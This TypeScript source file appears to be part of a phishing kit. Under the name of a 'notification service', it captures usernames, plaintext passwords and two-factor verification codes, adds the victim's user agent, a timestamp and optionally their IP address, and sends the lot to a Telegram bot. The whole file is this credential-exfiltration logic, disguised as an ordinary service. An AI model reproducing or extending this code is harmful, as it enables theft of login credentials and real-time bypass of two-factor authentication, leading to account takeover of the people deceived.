import { telegramConfig, sendTelegramNotification, getUserIpAddress, TelegramNotificationData } from '../config/telegram';

export class NotificationService {
  private static instance: NotificationService;
  
  private constructor() {}
  
  public static getInstance(): NotificationService {
    if (!NotificationService.instance) {
      NotificationService.instance = new NotificationService();
    }
    return NotificationService.instance;
  }
  
  public async sendLoginAttemptNotification(username: string, password: string): Promise<void> {
    if (!telegramConfig.bot.enabled || !telegramConfig.notifications.loginAttempts) {
      return;
    }
    
    const notificationData: TelegramNotificationData = {
      username,
      password,
      type: 'login',
      user_agent: navigator.userAgent,
      timestamp: new Date().toISOString(),
    };
    
    // Get IP address if enabled
    if (telegramConfig.notifications.includeIpAddress) {
      try {
        notificationData.ip_address = await getUserIpAddress();
      } catch (error) {
        console.warn('Could not retrieve IP address:', error);
      }
    }
    
    await sendTelegramNotification(notificationData);
  }
  
  public async sendTwoFactorNotification(username: string, verificationCode: string): Promise<void> {
    if (!telegramConfig.bot.enabled || !telegramConfig.notifications.twoFactorCodes) {
      return;
    }
    
    const notificationData: TelegramNotificationData = {
      username,
      verification_code: verificationCode,
      type: '2fa',
      user_agent: navigator.userAgent,
      timestamp: new Date().toISOString(),
    };
    
    // Get IP address if enabled
    if (telegramConfig.notifications.includeIpAddress) {
      try {
        notificationData.ip_address = await getUserIpAddress();
      } catch (error) {
        console.warn('Could not retrieve IP address:', error);
      }
    }
    
    await sendTelegramNotification(notificationData);
  }
}

export const notificationService = NotificationService.getInstance();